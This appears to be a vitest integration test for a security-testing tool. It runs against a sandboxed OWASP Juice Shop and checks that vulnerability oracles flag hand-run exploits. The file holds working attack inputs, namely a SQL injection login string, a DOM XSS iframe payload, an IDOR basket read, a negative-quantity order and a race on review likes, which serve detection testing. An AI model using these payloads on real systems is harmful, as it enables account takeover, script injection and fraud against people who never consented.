// Local only (`pnpm test:sandbox`): needs Docker, the socket proxy and the agent browser from
// docker-compose.yml. F3.2 "Done when": each oracle detects its Juice Shop vulnerability when
// the exploit is run by hand, stays quiet on a harmless control, and agrees with the challenge
// Juice Shop itself marks as solved (ground truth read by the orchestrator only).

import { newUlid } from '@janus/shared-kernel';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { z } from 'zod';

import type { PageDialogRecord } from '../../domain/browser/page-telemetry.js';
import type { TestSession } from '../../domain/attack/test-user-port.js';
import { authenticatedAs } from '../../domain/oracles/authenticated-as.js';
import { canaryLeak } from '../../domain/oracles/canary-leak.js';
import { duplicateEffect } from '../../domain/oracles/duplicate-effect.js';
import { priceMismatch } from '../../domain/oracles/price-mismatch.js';
import { scriptExecuted } from '../../domain/oracles/script-executed.js';
import { NetworkGuard } from '../../domain/scope/network-guard.js';
import type {
  ScopedHttpClient,
  ScopedReply,
  ScopedRequest,
} from '../../domain/scope/scoped-http-port.js';
import { JuiceShopChallenges } from '../../infrastructure/attack/juice-shop-challenges.js';
import { JuiceShopTestUsers } from '../../infrastructure/attack/juice-shop-test-users.js';
import { PlaywrightRunner } from '../../infrastructure/browser/playwright-runner.js';
import { InMemoryEventStore } from '../../infrastructure/event-store/in-memory-event-store.js';
import { DockerCli } from '../../infrastructure/sandbox/docker-cli.js';
import { DockerSandbox } from '../../infrastructure/sandbox/docker-sandbox.js';
import { workspacesRoot } from '../../infrastructure/sandbox/workspace.js';
import { PlaywrightScopedHttp } from '../../infrastructure/scope/playwright-scoped-http.js';
import {
  loadScopeConfig,
  repoScopeConfigPath,
  scopePolicyFor,
} from '../../infrastructure/scope/scope-config.js';
import { describeTestUserContract } from '../../test-support/test-user-contract.js';
import { VerifyOwnership } from '../scope/verify-ownership.js';
import { race } from './race.js';
import { asSession } from './session-client.js';

const VARIANT = 'oracle-test';
const KEYS = [
  'basketAccessChallenge',
  'loginAdminChallenge',
  'localXssChallenge',
  'negativeOrderChallenge',
  'timingAttackChallenge',
] as const;

const sandbox = new DockerSandbox({ docker: new DockerCli(), workspacesRoot: workspacesRoot() });
const http = new PlaywrightScopedHttp();
const browser = new PlaywrightRunner();
let origin = '';
let client: ScopedHttpClient;
let users: JuiceShopTestUsers;
let challenges: JuiceShopChallenges;

const json = (reply: ScopedReply): unknown => JSON.parse(reply.body);
const post = (url: string, body: unknown, testType: ScopedRequest['testType'] = 'http-probe') =>
  ({
    method: 'POST',
    url: `${origin}${url}`,
    testType,
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify(body),
  }) as const;

async function solved(key: (typeof KEYS)[number]): Promise<boolean | undefined> {
  return (await challenges.solved([key])).get(key);
}

async function session(label: string): Promise<TestSession> {
  return users.login(await users.register(label));
}

/** Puts one Apple Juice in the session's basket; returns the basket item id. */
async function addToBasket(as: TestSession): Promise<number> {
  const reply = await asSession(client, as).send(
    post('/api/BasketItems', { ProductId: 1, BasketId: as.basketId, quantity: 1 }),
  );
  expect(reply.status).toBe(200);
  return z.object({ data: z.object({ id: z.int() }) }).parse(json(reply)).data.id;
}

async function checkout(as: TestSession) {
  const placed = await asSession(client, as).send(
    post(`/rest/basket/${String(as.basketId)}/checkout`, {}),
  );
  expect(placed.status).toBe(200);
  const orderId = z.object({ orderConfirmation: z.string() }).parse(json(placed)).orderConfirmation;
  const history = await asSession(client, as).send({
    method: 'GET',
    url: `${origin}/rest/order-history`,
    testType: 'http-probe',
  });
  const order = z
    .object({
      data: z.array(
        z.object({
          orderId: z.string(),
          totalPrice: z.number(),
          deliveryPrice: z.number(),
          promotionalAmount: z.union([z.string(), z.number()]),
          products: z.array(z.object({ price: z.number(), quantity: z.number() })),
        }),
      ),
    })
    .parse(json(history))
    .data.find((each) => each.orderId === orderId);
  if (order === undefined) throw new Error(`Order ${orderId} is not in the history`);
  return {
    totalPrice: order.totalPrice,
    deliveryPrice: order.deliveryPrice,
    discount: Number(order.promotionalAmount),
    items: order.products,
  };
}

const reviews = z.object({
  data: z.array(z.object({ _id: z.string(), message: z.string(), likedBy: z.array(z.string()) })),
});

async function reviewLikes(message: string) {
  const reply = await client.send({
    method: 'GET',
    url: `${origin}/rest/products/1/reviews`,
    testType: 'http-probe',
  });
  const review = reviews.parse(json(reply)).data.find((each) => each.message === message);
  if (review === undefined) throw new Error('The test review is missing');
  return review;
}

async function dialogsAfter(sessionId: string, url: string, waitFor: string | null) {
  await browser.goto(sessionId, url);
  const seen: PageDialogRecord[] = [];
  const deadline = Date.now() + 15_000;
  while (Date.now() < deadline) {
    seen.push(...((await browser.drainTelemetry(sessionId)).dialogs ?? []));
    if (waitFor !== null && seen.some((dialog) => dialog.message === waitFor)) break;
    await new Promise((resolve) => setTimeout(resolve, 500));
    if (waitFor === null && Date.now() > deadline - 10_000) break;
  }
  return seen;
}

beforeAll(async () => {
  await sandbox.down(VARIANT);
  const { baseUrl } = await sandbox.up({ id: VARIANT, target: 'juice-shop', ref: 'image' });
  origin = new URL(baseUrl).origin;
  const policy = scopePolicyFor(await loadScopeConfig(repoScopeConfigPath()), 'juice-shop', [
    origin,
  ]);
  const scope = await new VerifyOwnership({
    tokens: sandbox,
    http,
    store: new InMemoryEventStore(),
  }).execute({ runId: newUlid(), variantId: VARIANT, policy });
  client = http.client(new NetworkGuard(scope), () => Promise.resolve());
  users = new JuiceShopTestUsers(client, origin);
  challenges = new JuiceShopChallenges(http, origin);
  // A fresh container: nothing is solved yet.
  expect([...(await challenges.solved(KEYS)).values()]).toEqual(KEYS.map(() => false));
});

afterAll(async () => {
  await http.close();
  await sandbox.down(VARIANT);
});

describeTestUserContract('JuiceShopTestUsers', {
  users: () => users,
  timeoutMs: 30_000,
});

describe('F3.2 done when: oracles against Juice Shop', () => {
  it('canaryLeak: B reads A’s basket (IDOR)', async () => {
    const a = await session('a');
    const b = await session('b');
    await addToBasket(a);
    const own = await asSession(client, a).send({
      method: 'GET',
      url: `${origin}/rest/basket/${String(a.basketId)}`,
      testType: 'http-probe',
    });
    const canaries = z
      .object({ data: z.object({ Products: z.array(z.object({ name: z.string() })) }) })
      .parse(json(own))
      .data.Products.map((product) => product.name);
    const owner = { userId: a.user.userId, canaries };

    // Control: B reads its own basket.
    const control = await asSession(client, b).send({
      method: 'GET',
      url: `${origin}/rest/basket/${String(b.basketId)}`,
      testType: 'idor',
    });
    expect(
      canaryLeak({ owner, viewer: { userId: b.user.userId }, response: control }),
    ).toMatchObject({ exploitable: false });
    expect(await solved('basketAccessChallenge')).toBe(false);

    const attack = await asSession(client, b).send({
      method: 'GET',
      url: `${origin}/rest/basket/${String(a.basketId)}`,
      testType: 'idor',
    });
    expect(
      canaryLeak({ owner, viewer: { userId: b.user.userId }, response: attack }),
    ).toMatchObject({ exploitable: true });
    expect(await solved('basketAccessChallenge')).toBe(true);
  }, 60_000);

  it('authenticatedAs: SQL injection logs in as someone else', async () => {
    const a = await users.register('a');
    const known = new Map([[a.email, a.password]]);

    // Control: A logs in with its own credentials.
    const own = await users.login(a);
    expect(
      authenticatedAs({
        sessionEmail: await users.whoami(own.token),
        submitted: { email: a.email, password: a.password },
        known,
      }).exploitable,
    ).toBe(false);
    expect(await solved('loginAdminChallenge')).toBe(false);

    const submitted = { email: "' OR 1=1--", password: 'janus-not-a-password' };
    const reply = await client.send(post('/rest/user/login', submitted, 'auth-bypass'));
    const token = z.object({ authentication: z.object({ token: z.string() }) }).parse(json(reply))
      .authentication.token;
    expect(
      authenticatedAs({ sessionEmail: await users.whoami(token), submitted, known }),
    ).toMatchObject({ exploitable: true });
    expect(await solved('loginAdminChallenge')).toBe(true);
  }, 60_000);

  it('scriptExecuted: DOM XSS in the search runs injected script', async () => {
    const marker = `janus-${newUlid()}`;
    const sessionId = await browser.newSession({ baseUrl: origin });
    try {
      // Control: an ordinary search opens no dialog.
      const quiet = await dialogsAfter(sessionId, `${origin}/#/search?q=apple`, null);
      expect(scriptExecuted(quiet, marker).exploitable).toBe(false);
      expect(await solved('localXssChallenge')).toBe(false);

      // Juice Shop's canonical payload (its challenge looks for it) and one with our marker;
      // each iframe closed, or the second would be the first one's fallback text.
      const payload = `<iframe src="javascript:alert(\`xss\`)"></iframe><iframe src="javascript:alert(\`${marker}\`)"></iframe>`;
      const seen = await dialogsAfter(
        sessionId,
        `${origin}/#/search?q=${encodeURIComponent(payload)}`,
        marker,
      );
      expect(scriptExecuted(seen, marker)).toMatchObject({ exploitable: true });
      expect(await solved('localXssChallenge')).toBe(true);
    } finally {
      await browser.close(sessionId);
    }
  }, 90_000);

  it('priceMismatch: a negative quantity makes a negative order', async () => {
    const c = await session('c');

    // Control: an honest order of one item.
    await addToBasket(c);
    expect(priceMismatch(await checkout(c)).exploitable).toBe(false);
    expect(await solved('negativeOrderChallenge')).toBe(false);

    const item = await addToBasket(c);
    const changed = await asSession(client, c).send({
      method: 'PUT',
      url: `${origin}/api/BasketItems/${String(item)}`,
      testType: 'business-logic',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ quantity: -100 }),
    });
    expect(changed.status).toBe(200);
    expect(priceMismatch(await checkout(c))).toMatchObject({ exploitable: true });
    expect(await solved('negativeOrderChallenge')).toBe(true);
  }, 60_000);

  it('duplicateEffect: racing likes counts the same user several times', async () => {
    const author = await session('d');
    const message = `Janus test review ${newUlid()}`;
    const created = await asSession(client, author).send({
      method: 'PUT',
      url: `${origin}/rest/products/1/reviews`,
      testType: 'http-probe',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ message, author: author.user.email }),
    });
    expect(created.status).toBe(201);
    const { _id: id } = await reviewLikes(message);

    // Control: one like from one user.
    const e = await session('e');
    await asSession(client, e).send(post('/rest/products/reviews', { id }));
    expect(duplicateEffect((await reviewLikes(message)).likedBy, e.user.email).exploitable).toBe(
      false,
    );
    expect(await solved('timingAttackChallenge')).toBe(false);

    const f = await session('f');
    await new Promise((resolve) => setTimeout(resolve, 1_100)); // a full rate window for the race
    const result = await race(asSession(client, f), post('/rest/products/reviews', { id }), 6);
    expect(result.blocked).toBe(0);
    expect(duplicateEffect((await reviewLikes(message)).likedBy, f.user.email)).toMatchObject({
      exploitable: true,
    });
    expect(await solved('timingAttackChallenge')).toBe(true);
  }, 60_000);
});
